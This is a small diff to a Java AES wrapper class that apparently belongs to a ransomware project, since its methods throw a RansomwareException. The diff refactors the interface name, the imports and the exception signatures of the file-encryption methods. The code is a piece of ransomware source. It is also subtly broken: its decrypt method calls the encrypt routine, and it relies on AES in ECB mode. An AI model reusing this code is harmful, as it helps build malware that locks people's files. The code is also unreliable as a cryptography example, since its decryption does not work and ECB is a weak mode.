@@ -5,13 +5,14 @@ import java.security.GeneralSecurityException;
 
 import javax.crypto.SecretKey;
 
+import Agent.Utils.JavaCryptoUtil;
 import Agent.exceptions.CryptoException;
 import Agent.exceptions.RansomwareException;
 
-public class AES implements CryptoInterface {
+public class AES implements CryptoAlgorithm {
 
 	@Override
-	public void encrypt(SecretKey skey, File fileToEncrypt) throws RansomwareException, GeneralSecurityException {
+	public void encrypt(SecretKey skey, File fileToEncrypt) throws RansomwareException {
 
 		try {
 			JavaCryptoUtil.encrypt(skey, fileToEncrypt, "AES/ECB/PKCS5Padding");
@@ -22,7 +23,7 @@ public class AES implements CryptoInterface {
 	}
 
 	@Override
-	public void decrypt(SecretKey skey, File fileToDecrypt)throws RansomwareException, GeneralSecurityException {
+	public void decrypt(SecretKey skey, File fileToDecrypt)throws RansomwareException {
 
 		try {
 			JavaCryptoUtil.encrypt(skey, fileToDecrypt, "AES/ECB/PKCS5Padding");
